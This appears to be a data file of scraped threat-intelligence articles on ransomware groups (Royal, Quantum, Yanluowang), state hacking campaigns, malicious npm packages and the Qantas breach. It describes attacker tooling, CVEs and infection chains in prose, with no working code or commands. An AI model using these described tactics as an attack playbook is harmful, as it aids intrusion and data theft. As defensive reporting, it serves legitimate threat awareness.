such as Virtual Hard Disk (VHD) to impersonate legitimate software for first-stage payloads.\nRoyal also uses various infection chains that use PowerShell and batch scripts, ultimately leading to the download of malware payloads such as a legitimate remote management tool used for persistence on the network.\nThe management tool also acts as an access point for the staging and spreading of ransomware.\nBy late October 2022, Royal was using malicious Google Ads to deliver BATLOADER in what researchers are calling a malvertising campaign.\nThe Google Ads pointed to the legitimate traffic distribution system (TDS) Keitaro.\nAccording to Microsoft, Keitaro provides capabilities to customize advertising campaigns via tracking and ad traffic and user or device-based filtering.\nThe TDS redirects the victim to a legitimate download site or to a malicious BATLOADER download site.\nBy using Keitaro, Royal can filter traffic and avoid IP ranges of known security sandboxing solutions.\nAlthough there are no confirmed reports of successful ransomware payments between Royal and their victims, evolving ransomware groups like Royal don’t give up easily.\nThey will keep evolving their tactics and techniques, targeting enterprises and organizations until they achieve their ultimate goal – financial gain.\nFortunately, there are ways organizations can stay safe and protect themselves from Royal: Making sure that your organization takes proactive measures by keeping track of Indicators of Compromise (IoCs) and by keeping track of Royal’s attack methods will ensure good defense against Royal ransomware.\nIt’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nAvertium offers the following services to keep your organization safe: The FBI, CISA, and HHS urge all organizations to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents: Hashes New Royal Ransomware emerges in multi-million dollar attacks (bleepingcomputer.com) HHS warns Royal ransomware threat targeting healthcare providers | SC Media (scmagazine.com) DEV-0569 finds new ways to deliver Royal ransomware, various payloads - Microsoft Security Blog Popular UK motor racing circuit investigating ransomware attack - The Record by Recorded Future This sneaky ransomware gang keeps changing tactics to spread its malware | ZDNET Microsoft: Royal ransomware group using Google Ads in campaign - The Record by Recorded Future Microsoft Warns of Cybercrime Group Delivering Royal Ransomware, Other Malware | SecurityWeek.\nCom Travis Central Appraisal District hit with ransomware, officials say (statesman.com) 202212071400_Royal Ransomware Analyst Note_TLPCLEAR (hhs.gov) This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":69,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"royal-ransomware"}}
{"id":15,"title":"An In-Depth Look at Quantum Ransomware","publish_date":"2021-08-28","link":"https://www.avertium.com/resources/threat-reports/an-in-depth-look-at-quantum-ransomware","clean_text":"Executive Summary As long as there is money to be made, ransomware will continue to be a global issue for organizations.\nRecently, Sophos published a report regarding the state of ransomware for 2022.\nThe company conducted an independent, vendor-agnostic survey of 5,600 IT professionals in mid-sized organizations (including 381 healthcare respondents) across 31 countries.\nThe report revealed that 66% of the healthcare organizations surveyed were compromised by ransomware in the last year – 34% more than 2020.\nThis data means that there was a 94% increase in healthcare ransomware attacks over the course of one year.\nThreat actors are becoming more strategic and more capable of executing ransomware attacks at scale.\nThe uptick in ransomware attacks is more than likely due to the continued success of the RaaS model.\nQuantum ransomware is a newer, lesser-known ransomware that operates with the RaaS model and has been very successful with compromising healthcare organizations.\nIn the past, threat actors tried to steer clear of attacking the healthcare sector but lately, attackers have dismissed all ethics and morals and are going full force with attacks.\nNow that threat actors like those behind Quantum ransomware know how vulnerable healthcare organizations are, we can expect many more ransomware attacks for the sector.\nLet’s take a look at Quantum ransomware, their recent attacks, and why social engineering and phishing are a major threat for healthcare organizations.\nDiscovered in August 2021, Quantum ransomware is linked to the Quantum Locker operation.\nQuantum Locker has had a few rebrands (AstroLocker, MountLocker, and XingLocker).\nOur technology partner, AdvIntel, confirmed that Quantum is a splinter group from Conti and that the ransomware operation was taken over by Conti Team Two in April 2022 – keeping Quantum’s original name.\nIn June 2022, Quantum was observed employing their version of BazarCall, called Jormungandr, and hiring people who specialized in OSINT, spamming, design, and call center operations.\nBazarCall is a method that is also known as call-back phishing.\nThis tactic emerged in early 2021 as an attack vector used by Ryuk ransomware (later evolving into Conti).\nBazarCall is used to gain initial access into a victim’s network and involves emailing victims.\nThe emails allege that a paid subscription is up for automatic renewal, but the renewal can be cancelled if the victim calls a specific number.\nOnce the victim calls the number, the threat actor on the other end of the line convinces the victim via social engineering to start a remote access session by the use of legitimate software controlled by a network intruder.\nWhile the victim is distracted on the call, the intruder tries to figure out how to compromise the victim’s network without triggering alarms.\nThese kinds of attacks are highly targeted and make it difficult for cyber security professionals to detect due to the social engineering aspect of the attack.\nAdvIntel believes that the switch to social engineering is more than likely due to the predictability of ransomware attacks, causing profits to decline for adversaries.\nIf threat actors like Quantum are able to trick people, they can have a more flexible approach to their attacks – making them difficult to defend.\nQuantum’s BazarCall campaigns have grown more sophisticated in just two months’ time.\nThey’ve impersonated a large number of brands, including: When Quantum initially emerged, they experimented with BazarCall emails and impersonated Oracle.\nThey delivered phishing emails to more than 200,000 people with the below email language.\nImage 1: Fake CrowdStrike Email Source: AdvIntel Using the same method, Quantum was observed in another phishing operation where they impersonated the Luchechko brand.\nThe threat actors sent a message regarding the company discriminating against an individual based on their ethnicity.\nQuantum chose Luchechko due to the company being Eastern European, therefore, the victim wouldn’t be suspicious of the threat actor’s accent.\nIn July 2022, Quantum successfully locked up the network of a New Jersey healthcare system.\nThey exfiltrated data from the organization and demanded $500,000 in ransom in exchange for the data’s return.\nThe healthcare organization is a private, statewide, non-profit behavioral healthcare organization that specializes in treating developmental disabilities and other health conditions.\nAdditionally, prior to attacking the healthcare organization in New Jersey, Quantum was responsible for attacking Interim Healthcare in July 2022, as well as a research-based biopharmaceutical company in June 2022.\nQuantum also attacked an IVF clinic based in Delhi, India.\nThe clinic provides IVF and fertility treatments by using cutting edge technology.\nAs previously stated, Quantum is a merger between Quantum Locker and several members of Conti’s former pentesting group called Conti Team Two.\nAccording to AdvIntel, when Conti dissolved, members of the group decided to distance themselves from the toxic Conti brand.\nThe two largest divisions of Conti created their own collectives – Team Two created the current version of Quantum, while Team One created Royal Zeon.\nQuantum’s Jormungandr campaign is a major development that Quantum has been preparing for since June 2022.\nThe phishing campaign is a derivative of BazarCall, and initial access is achieved by utilizing IcedID for reconnaissance tasks, as well as persistence.\nThe DFIR Report published a case summary in April 2022 that showed the threat actors entering a victim’s network when a user endpoint was compromised by an IcedID payload contained within an ISO image, likely delivered via email.\nAccording to the DFIR Report, the ISO contained IcedID malware and a LNK shortcut to execute it.\nAfter the initial IcedID payload was executed, it only took 2 hours after initial infection for Quantum to begin hands-on-keyboard activity.\nThey then quickly deployed Cobalt Strike and RDP to move across the network before using WMI and PsExec to deploy the Quantum ransomware.\nImage 2: IcedID and Cobalt Strike Source: The DFIR Report According to Avertium’s Cyber Threat Intelligence Team, ISO file types are a common way of grouping files together, but unlike zipped files, ISO files are mountable, allowing the user to attach the file like a virtual CD and access the files.\nThis also lends itself to malware delivery quite well.\nIn this case docs_invoice_173.iso contained two files, a hidden DLL file, and a LNK file made to look like a document.\nImage 3: LINK File Masquerading as a Document Source: Avertium's Cyber Threat Intelligence Team Image 4: LINK File Source: Avertium's Cyber Threat Intelligence Team Once Quantum gains initial access, Cobalt Strike is injected into the cmd.exe process.\nAdFind is abused by the threat actors and helps them map out the active directory structure and abuse nslookup to gather network information from hosts.\nCredentials are then extracted from LSASS memory and tested using WMI discovery.\nNext, Quantum copies the ransomware payload, ttsel.exe, followed by the dropping of the ransom note into each infected host with the file name “README_TO_DECRYPT.html”.\nThe ransom note contains a portal to reach out and contact the threat actors for negotiation purposes.\nQuantum achieves persistence by encrypting files and folders on their victim’s machine.\nThe threat actor’s demanded ransom ranges between $150k and $200k but have been higher for some organizations.\nThe whole process takes less than 4 hours – a very short time-to-ransom.\nImage 5: Ransom Note Source: The DFIR Report In October 2021, Avertium’s Cyber Threat Intelligence Team published a Threat Intelligence Report regarding the healthcare industry and why the industry is constantly at risk for security incidents.\nThe industry is two to three times more likely to be a target for cybercrime than any other industry.\nSome ransomware gangs try not to focus on attacking healthcare facilities, but Quantum is not one of those groups.\nQuantum’s use of social engineering is quite disturbing because it’s difficult to track.\nBy using social engineering and pretending to be legitimate organizations, Quantum has been able to breach and ransom several high-profile organizations.\nSocial engineering is a major threat to the healthcare sector because healthcare organizations house sensitive information for patients (dates of birth, social security numbers, addresses, etc.).\nAccording to Avertium’s blog on phishing, phishing attacks are often a vessel to deliver malware that masquerades as a communication from a trusted or reputable source.\nAlthough Quantum now uses call-back phishing, they have also used email phishing in their social engineering attacks.\nPhishing attacks can come in the form of an email, a phone call, or a text message (smishing) – with the most common vehicle being through email.\nA phishing attack email typically looks or sounds like it’s from a company or someone within your organization.\nThe threat actor behind the attack will ask for privileged information’s or provide a link to an attachment which results in you downloading something malicious.\nSocial engineering is included in all kinds of phishing attacks and involves threat actors researching companies or individuals prior to the attack.\nThe goal is to get the victim to trust the threat actor by providing a lot of convincing information about the victim – something Quantum seems to have mastered.\nQuantum takes advantage of core human psychology to manipulate people into doing exactly what they want.\nIf threat actors like Quantum are able to successfully breach healthcare organizations via social engineering, they will be able to gain access to data that could cripple an organization.\nClinics, hospitals, and healthcare systems possess a high volume of patient and employee information.\nThe information could be used for a verity of illicit activities including financial fraud and for other activities within Quantum’s social engineering campaigns.\nIt’s important to get ahead of the curve by being proactive with protecting your organization, instead of waiting to put out a massive fire.\nAvertium offers the following services to keep your organization safe: Avertium and AdvIntel recommend the following to mitigate Quantum ransomware: Files IcedID Cobalt Strike Network Detections The State of Ransomware in 2022 | BlackFog Quantum Ransomware | Cyborg Security Hackers impersonate cybersecurity firms in callback phishing attacks (bleepingcomputer.com) sophos-state-of-ransomware-healthcare-2022-wp.pdf Ransomware gangs move to 'callback' social engineering attacks (bleepingcomputer.com) Quantum Ransomware – The DFIR Report Social Engineering Attacks - Check Point Software The Top 5 Cyber Threats Within the Education Sector (avertium.com) Quantum ransomware gang: fast and furious | Cybernews Cybereason vs. Quantum Locker Ransomware This document and its contents do not constitute, and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of Client's compliance with any law, regulation or standard.\nCOPYRIGHT: Copyright © Avertium, LLC and/or Avertium Tennessee, Inc. | All rights reserved.","num_sentences":79,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"uantum-ransomware"}}
{"id":16,"title":"An In-Depth Look at Yanluowang Ransomware","publish_date":"2021-10-28","link":"https://www.avertium.com/resources/threat-reports/in-depth-look-at-yanluowang-ransomware","clean_text":"United States organizations within the financial sector are currently being attacked by a recently discovered ransomware operation named, Yanluowang.\nThe ransomware operation is highly experienced with ransomware-as-a-service (RaaS) and could be linked to veteran RaaS groups, Fivehands and Thieflock.\nAlthough the group is primarily focused on attacking organizations within the financial sector, they have also targeted companies in manufacturing, IT services, consultancy, and engineering.\nLet’s take a look at Yanluowang’s techniques, tactics, and how they may be connected to Fivehands and Thieflock.\nImportant Note: As of now, the ransomware gang is named Yanluowang, as well as their ransomware.\nTherefore, the name Yanluowang will be used interchangeably throughout this report.\nIn October 2021, Symantec’s Threat Hunter Team, a division of Broadcom Software, discovered that Yanluowang ransomware was actively being used by a threat actor who was seen attacking U.S. corporations since at least August 2021.\nWhat was interesting about the attack was that many of the tools, tactics, and procedures (TTPs) used were previously used by ransomware threat actor, Thieflock.\nMost analysts assumed that the threat actor using Yanluowang must be an affiliate of Thieflock who shifted allegiances.\nAlthough Yanluowang attempted to attack a large organization in October 2021 by deploying ransomware, they were not successful due to the ransomware being somewhat underdeveloped.\nAccording to Symantec, their Threat Hunter Team initially discovered the use of AdFind, a legitimate command-line Active Directory query tool, on the undisclosed target’s network.\nRansomware attackers often use AdFind as a reconnaissance tool.\nThe tool also equipped attackers with resources that they needed for lateral movement by way of Active Directory.\nDays after discovering the suspicious use of AdFind, attackers attempted to deploy Yanluowang ransomware.\nThrough research, Symantec observed the following precursor tools carrying out the below actions: After Yanluowang is deployed, it carries out the following actions: After further research, Symantec found that most of the time, the threat actors behind Yanluowang used PowerShell to download tools to compromised systems, using BazarLoader to assist in reconnaissance.\nThey then enable RDP via registry so they can enable remote access.\nConnectWise (a remote access tool) is deployed after attackers gain initial access.\nAdFind and SoftPerfect Network Scanner (netscan.exe – a tool used for discovery of hostnames and network services) is used to perform lateral movement and identify systems of interest.\nThe next phase of Yanluowang’s attack is credential theft by way of credential-stealing tools.\nThese tools include: Also, a number of open-source tools are used like KeeThief – a PowerShell script that copies the master key from KeePass.\nYanluowang also uses customized versions of open-source credential dumping tools (secretdump.exe), which also aid in dumping credentials from the registry.\nCobalt Strike Beacon was also seen deployed against at least one targeted organization.\nImage 1: Yanluowang Ransom Note Source: Symantec Additionally, the threat actors behind Yanluowang leave behind a ransom note that warns victims not to contact law enforcement or ransomware negotiation firms.\nIf they do, the attackers will conduct a distributed denial of service (DDoS) attack and make “calls to employees and business partners”.\nThey’ve also threatened to repeat the attack in a matter of weeks and delete their victim’s data.\nMany speculate that Yanluowang could be connected to Thieflock and Fivehands.\nAfter researchers looked into the tactics and techniques that Yanluowang uses, they noticed a possible connection to older attacks with Thieflock, which is a ransomware operation developed by the Fivehands ransomware group.\nFivehands is a ransomware variant that has been used to steal information, obfuscate files, accomplish network discovery, and accomplish credential access.\nAs of April 2021, Fivehands was used by threat actor UNC2447 to exploit a SonicWall software flaw before the flaw was fixed.\nWhile Fivehands is relatively new to the ransomware scene, it is being linked to Yanluowang by researchers.\nWhen UNC2447 exploited SonicWall, they showed advanced capabilities to evade detection and minimize post-intrusion forensics – like Yanluowang.\nAlso, Yanluowang relies on several tactics and techniques found in Fivehands ransomware such as using GrabFF , SoftPerfect Network Scanner, and the S3 browser and Cent browser to upload and download data.\nResearchers and analysts are curious about the connection between Yanluowang, Thieflock, and Fivehands, but right now, there isn’t a ton of evidence confirming a connection between Yanluowang, Thieflock, and Fivehands.\nResearchers still stand firm on their belief that the cyber criminals behind Yanluowang could just have a former affiliate of Thieflock in their arsenal.\nBecause law enforcement is cracking down on ransomware operations, there are many new variants that have surfaced over the year.\nMany new strains have been used in double-extortion attacks where attackers encrypt stolen data and threaten to leak it if demands aren’t honored.\nIn October alone, 314 organizations worldwide became the victims of double-extortion attacks with the worst offenders being Conti, LockBit, Hive, and BlackMatter.\nYanluowang’s goal is to locate and steal as much information (passwords, usernames, etc.)\nas possible to use against their victims.\nTheir ransom note indicates the threat of double extortion if victims don’t comply with their demands.\nIf organizations are going to protect themselves from threat actors like Yanluowang who will stop at nothing for financial gain, it’s important to become familiar with their tactics and techniques.\nResearch from the U.S. Financial Crimes Enforcement Network (FinCEN) discovered that payments linked to ransomware attacks amount to $590 million in 2021.\nThis exceeds the total for 2020 and is continuing to rise.\nBecause the cyber landscape is always changing, it’s imperative to be aware of new cyber attack strategies and techniques.\nAvertium is here to keep you informed and to keep your organization safe.\nWe recommend the following for the best protection against ransomware attacks: Recommendations from Avertium and our partner, Advanced Intelligence: If your organization is impacted by a ransomware attack, the FBI and CISA recommend the following: Yanluowang Fivehands Yanluowang Fivehands DDoS - disruption to internet-based services that can make any internet connected machine unavailable to perform its intended purpose.\nPowerShell – used for automating the management of systems.\nCan also be used to build, test, and deploy solutions, often in CI/CD environments.\nRansomware - malicious software that infects a device and stops users from accessing data and files until a ransom is paid.\nRDP - technical standard for using a desktop computer remotely.\nYanluowang: Further Insights on New Ransomware Threat | Symantec Blogs (security.com) New Yanluowang Ransomware Used in Targeted Attacks | Symantec Blogs (security.com) Yanluowang ransomware operation matures with experienced affiliates (bleepingcomputer.com) FiveHands Ransomware Overview (avertium.com) Zero-Day Attacks Threaten Healthcare Cybersecurity (healthitsecurity.com) Hacking group exploited SonicWall zero-day for ransomware attacks, FireEye says (cyberscoop.com) New Ransomware Variant Could Become Next Big Threat (darkreading.com) What is PowerShell? -\nPowerShell | Microsoft Docs This document and its contents do not constitute and are not a substitute for, legal advice.\nThe outcome of a Security Risk Assessment should be utilized to ensure that diligent measures are taken to lower the risk of potential weaknesses be exploited to compromise data.\nAlthough the Services and this report may provide data that Client can use in its compliance efforts, Client (not Avertium) is ultimately responsible for assessing and meeting Client's own compliance responsibilities.\nThis report does not constitute a guarantee or assurance of the Client's compliance with any law, regulation, or standard.","num_sentences":55,"metadata":{"source":"blog","platform":"AVERTIUM","filename":"yanluowang"}}
{"id":17,"title":"BadPilot network hacking campaign fuels Russian SandWorm attacks","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/badpilot-network-hacking-campaign-fuels-russian-sandworm-attacks/","clean_text":"A subgroup of the Russian state-sponsored hacking group APT44, also known as 'Seashell Blizzard' and 'Sandworm', has been targeting critical organizations and governments in a multi-year campaign dubbed 'BadPilot.'\nThe threat actor has been active since at least 2021 and is also responsible for breaching networks of organizations in energy, oil and gas, telecommunications, shipping, and arms manufacturing sectors.\nMicrosoft's Threat Intelligence team says that the actor is dedicated to achieving initial access to target systems, establishing persistence, and maintaining presence to allow other APT44 subgroups with post-compromise expertise to take over. \"\nWe have also observed the initial access subgroup to pursue access to an organization prior to a Seashell Blizzard-linked destructive attack,\" reads a Microsoft report shared with BleepingComputer.\nMicrosoft's assessment is \"that Seashell Blizzard uses this initial access subgroup to horizontally scale their operations as new exploits are acquired and to sustain persistent access to current and future sectors of interest to Russia.\"\nTargeting scope Microsoft's earliest observations of the subgroup's activity show opportunistic operations targeting Ukraine, Europe, Central and South Asia, and the Middle East, focusing on critical sectors.\nStarting 2022, following Russia's invasion of Ukraine, the subgroup intensified its operations against critical infrastructure supporting Ukraine, including government, military, transportation, and logistics sectors.\nTheir intrusions aimed at intelligence collection, operational disruptions, and wiper attacks aimed at corrupting data at the targeted systems. \"\nWe assess that the subgroup has likely enabled at least three destructive cyberattacks in Ukraine since 2023,\" mentions Microsoft regarding the subgroup's specific activity.\nBy 2023, the subgroup's targeting scope had broadened, conducting large-scale compromises across Europe, the United States, and the Middle East, and in 2024, it started focusing on the United States, United Kingdom, Canada, and Australia.\nInitial access and post-compromise activity The APT44 subgroup employs multiple techniques to compromise networks, including exploiting n-day vulnerabilities in internet-facing infrastructure, credential theft, and supply chain attacks.\nSupply-chain attacks were particularly effective against organizations across Europe and Ukraine, where the hackers targeted regionally managed IT service providers and then accessed multiple clients.\nMicrosoft has observed network scans and subsequent exploitation attempts of the following vulnerabilities: - CVE-2021-34473 (Microsoft Exchange) - CVE-2022-41352 (Zimbra Collaboration Suite) - CVE-2023-32315 (OpenFire) - CVE-2023-42793 (JetBrains TeamCity) - CVE-2023-23397 (Microsoft Outlook) - CVE-2024-1709 (ConnectWise ScreenConnect) - CVE-2023-48788 (Fortinet FortiClient EMS) After exploiting the above vulnerabilities to obtain access, the hackers established persistence by deploying custom web shells like 'LocalOlive'.\nIn 2024, the APT44 subgroup started to use legitimate IT remote management tools such as Atera Agent and Splashtop Remote Services to execute commands on compromised systems while posing as IT admins to evade detection.\nRegarding the post-initial access activity, the threat actors use Procdump or the Windows registry to steal credentials, and Rclone, Chisel, and Plink for data exfiltration through covert network tunnels.\nResearchers observed a novel technique in 2024 as the threat actor routed traffic through the Tor network \"effectively cloaking all inbound connections to the affected asset and limiting exposures from both the actor and victim environment.\"\nFinally, the subgroup performs lateral movement to reach all the parts of the network it can, and modifies the infrastructure as required for its operations.\nThe modifications include DNS configuration manipulations, the creation of new services and scheduled tasks, and the configuration of backdoor access using OpenSSH with unique public keys.\nMicrosoft says that the Russian hacker subgroup has \"near-global reach\" and helps Seashell Blizzard expand its geographical targeting.\nIn the report published today, the researchers share hunting queries, indicators of compromise (IoCs), and YARA rules for defenders to catch this threat actor's activity and stop it before .\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":22,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"BadPilot"}}
{"id":18,"title":"New wave of ‘fake interviews’ use 35 npm packages to spread malware","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/new-wave-of-fake-interviews-use-35-npm-packages-to-spread-malware/","clean_text":"A new wave of North Korea's 'Contagious Interview' campaign is targeting job seekers with malicious npm packages that infect dev's devices with infostealers and backdoors.\nThe packages were discovered by Socket Threat Research, which reports they load the BeaverTail info-stealer and InvisibleFerret backdoor on victims' machines, two well-documented payloads associated with DPRK actors.\nThe latest attack wave uses 35 malicious packages submitted to npm through 24 accounts.\nThe packages have been downloaded over 4,000 times in total, and six of them remain available at the time of writing.\nSeveral of the 35 malicious npm packages typosquat or mimic well-known and trusted libraries, making them especially dangerous.\nNotable examples of those are: - react-plaid-sdk, reactbootstraps - vite-plugin-next-refresh, vite-loader-svg - node-orm-mongoose - jsonpacks, jsonspecific - chalk-config - node-loggers, *-logger - framer-motion-ext - nextjs-insight - struct-logger, logbin-nodejs Victims, typically software engineers and developers, are led to download these packages by North Korean operatives posing as recruiters, requesting job candidates to work on a test project. \"\nPosing as recruiters on LinkedIn, the North Korean threat actors send coding \"assignments\" to developers and job seekers via Google Docs, embed these malicious packages within the project, and often pressure candidates to run the code outside containerized environments while screen-sharing,\" explains Socket.\nThe assignments are hosted on Bitbucket and disguised as legitimate tests, but in reality, they trigger an infection chain that drops multiple payloads on the target's computer.\nThe first stage is HexEval Loader, hidden in the npm packages, which fingerprints the host, contacts the threat actor's command-and-control (C2) server, and uses 'eval()' to fetch and execute the second stage payload, BeaverTail.\nBeaverTail is a multi-platform info-stealer and malware loader that steals browser data, including cookies and cryptocurrency wallets, and loads the third stage, InvisibleFerret.\nInvisibleFerret is a cross-platform persistent backdoor delivered as a ZIP file, giving the attackers deeper, ongoing access to the victim's system with remote control, file theft, and screen-shooting capabilities.\nFinally, the attackers drop a cross-platform (Windows, macOS, Linux) keylogger tool that hooks into low-level input events and performs real-time surveillance and data exfiltration.\nThis keylogger was only associated with one of the npm aliases used in the campaign, so it might be deployed only on select high-value targets.\nSoftware developers approached with lucrative remote job offers should treat these invitations with caution and always run unknown code in containers or virtual machines instead of executing it on their OS.\nLast March, North Korean hackers Lazarus were caught submitting another set of malicious packages on npm, so this is an ongoing risk.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":17,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"Contagious Interview"}}
{"id":19,"title":"Qantas discloses cyberattack amid Scattered Spider aviation breaches","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/qantas-discloses-cyberattack-amid-scattered-spider-aviation-breaches/","clean_text":"Australian airline Qantas disclosed that it detected a cyberattack on Monday after threat actors gained access to a third-party platform containing customer data.\nQantas is Australia's largest airline, operating domestic and international flights across six continents and employing around 24,000 people.\nIn a press release issued Monday night, the airline states that the attack has been contained, but a \"significant\" amount of data is believed to have been stolen.\nThe breach began after a threat actor targeted a Qantas call centre and gained access to a third-party customer servicing platform. \"\nOn Monday, we detected unusual activity on a third party platform used by a Qantas airline contact centre.\nWe then took immediate steps and contained the system.\nWe can confirm all Qantas systems remain secure,\" Qantas stated. \"\nThere are 6 million customers that have service records in this platform.\nWe are continuing to investigate the proportion of the data that has been stolen, though we expect it will be significant.\nAn initial review has confirmed the data includes some customers' names, email addresses, phone numbers, birth dates and frequent flyer numbers.\"\nQantas says no credit card or personal financial information was exposed, and frequent flyer account passwords, PINs, and login details were not impacted.\nAfter detecting the breach, Qantas says it notified the Australian Cyber Security Centre, the Office of the Australian Information Commissioner, and the Australian Federal Police.\nIt's unclear if external cybersecurity experts are assisting with the investigation.\nScattered Spider attacks target aviation firms This attack comes as cybersecurity firms warn that hackers known as \"Scattered Spider\" have begun targeting the aviation and transportation industries.\nWhile it is unclear if this group is behind the Qantas attack, BleepingComputer has learned the incident shares similarities with other recent attacks by the threat actors.\nScattered Spider (also tracked as 0ktapus, UNC3944, Scatter Swine, Starfraud, and Muddled Libra) is a group of threat actors known for their conducting social engineering and identity-based attacks against organizations worldwide, commonly using phishing, SIM swapping, MFA bombing, and help desk phone calls to gain access to employee credentials.\nIn September 2023, they escalated their attacks by breaching MGM Resorts and encrypting over 100 VMware ESXi hypervisors using BlackCat ransomware after gaining access by impersonating an employee.\nThey've also partnered with other ransomware operations, such as RansomHub, Qilin, and DragonForce.\nOther organizations targeted by Scattered Spider include Twilio, Coinbase, DoorDash, Caesars, MailChimp, Riot Games, and Reddit.\nAfter recently focusing on retail and insurance companies, cybersecurity firms warned on Friday that Scattered Spider had shifted its attention to aviation, with recent attacks on Hawaiian Airlines and WestJet believed to be linked to the threat actors.\nBleepingComputer has learned that in the WestJet breach, threat actors exploited a self-service password reset to gain access to an employee's account, which was then used to breach the network.\nThe threat actors have been employing a sector-by-sector approach to their attacks, and it is unclear if they are done with the aviation sector and what industry will be targeted next.\nOrganizations defending against this type of threat should start by gaining complete visibility across the entire infrastructure, identity systems, and critical management services.\nThis includes securing self-service password reset platforms, help desks, and third-party identity vendors, which have become common targets of these threat actors.\nBoth Google Threat Intelligence Group (GTIG) and Palo Alto Networks have released guides on hardening defenses against the known \"Scattered Spider\" tactics, which admins should familiarize themselves with.\nOther recent cyberattacks believed to be associated with Scattered Spider include M&S, Co-op, Erie Insurance, and Aflac.\n8 Common Threats in 2025 While cloud attacks may be growing more sophisticated, attackers still succeed with surprisingly simple techniques.\nDrawing from Wiz's detections across thousands of organizations, this report reveals 8 key techniques used by cloud-fluent threat actors.","num_sentences":28,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"Qantas"}}
{"id":20,"title":"Government webmail hacked via XSS bugs in global spy campaign","publish_date":null,"link":"https://www.bleepingcomputer.com/news/security/government-webmail-hacked-via-xss-bugs-in-global-spy-campaign/","clean_text":"Hackers are running a worldwide cyberespionage campaign dubbed 'RoundPress,' leveraging zero-day and n-day flaws in webmail servers to steal email from high-value government organizations.\nESET researchers who uncovered the operation attribute it with medium confidence to the Russian state-sponsored hackers APT28 (aka \"Fancy Bear\" or \"Sednit\").\nThe campaign started in 2023 and continued with the adoption of new exploits in 2024, targeting Roundcube, Horde, MDaemon, and Zimbra.\nNotable targets include governments in Greece, Ukraine, Serbia, and Cameroon, military units in Ukraine and Ecuador, defense companies in Ukraine, Bulgaria, and Romania, and critical infrastructure in Ukraine and Bulgaria.\nOpen email, have data stolen The attack starts with a spear-phishing email referencing current news or political events, often including excerpts from news articles to add legitimacy.\nA malicious JavaScript payload embedded in the HTML body of the email triggers the exploitation of a cross-site scripting (XSS) vulnerability in the webmail browser page used by the recipient.\nAll that is needed from the victim is to open the email to view it, as no other interaction/clicks, redirections, or data input is required for the malicious JavaScript script to execute.\nThe payload has no persistence mechanisms, so it only executes when the malicious email is opened.\nThe script creates invisible input fields to trick browsers or password managers into autofilling stored credentials for the victim's email accounts.\nAdditionally, it reads the DOM or sends HTTP requests to collect email message content, contacts, webmail settings, login history, two-factor authentication, and passwords.\nThe data is then exfiltrated to hardcoded command-and-control (C2) addresses using HTTP POST requests.\nEach script has a slightly different set of capabilities, adjusted for the product it's targeting.\nVulnerabilities targeted Operation RoundPress targeted multiple XSS flaws in various webmail products that important organizations commonly use to inject their malicious JS scripts.\nThe exploitation ESET associated with this campaign involves the following flaws: - Roundcube – CVE-2020-35730: A stored XSS flaw the hackers used in 2023, by embedding JavaScript directly into the body of an email.\nWhen victims opened the email in a browser-based webmail session, the script executed in their context, enabling credential and data theft. -\nRoundcube – CVE-2023-43770: An XSS vulnerability in how Roundcube handled hyperlink text leveraged in early 2024.\nImproper sanitization allowed attackers to inject","num_sentences":17,"metadata":{"source":"blog","platform":"BleepingComputer","filename":"RoundPress"}}
{"id":21,"title":"FBI: Androxgh0st malware botnet steals AWS, Microsoft credentials","publish_date":"2025-07-28","link":"https://www.bleepingcomputer.com/news/security/fbi-androxgh0st-malware-botnet-steals-aws-microsoft-credentials/","clean_text":"CISA and the FBI warned today that threat actors using Androxgh0st malware are building a botnet focused on cloud credential theft and using the stolen information to deliver additional malicious payloads.\nThis botnet was first spotted by Lacework Labs in 2022 and was controlling over 40,000 devices almost one year ago, according to Fortiguard Labs data.\nIt scans for websites and servers vulnerable to the following remote code execution (RCE) vulnerabilities: CVE-2017-9841 (PHPUnit unit testing framework), CVE-2021-41773 (Apache HTTP Server), and CVE-2018-15133 (Laravel PHP web framework). \"\nAndroxgh0st is a Python-scripted malware primarily used to target .env files that contain confidential information, such as credentials for various high profile applications (i.e., Amazon Web Services [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework),\" the two agencies cautioned. \"\nAndroxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning and exploiting exposed credentials and application programming interfaces (APIs), and web shell deployment.\"\nStolen Twilio and SendGrid credentials can be used by the threat actors to conduct spam campaigns impersonating the breached companies. \"\nDepending on the usage, AndroxGh0st can perform one of two primary functions against acquired credentials.\nThe most commonly observed of these is to check the email sending limit for the account to assess if it can be leveraged for spamming,\" according to Lacework.\nThe attackers have also been observed creating fake pages on compromised websites, providing them with a backdoor to access databases containing sensitive information and deploy more malicious tools vital for their operations.\nUpon successfully identifying and compromising AWS credentials on a vulnerable website, they've also tried creating new users and user policies.\nFurthermore, Andoxgh0st operators use stolen credentials to spin up new AWS instances for scanning additional vulnerable targets 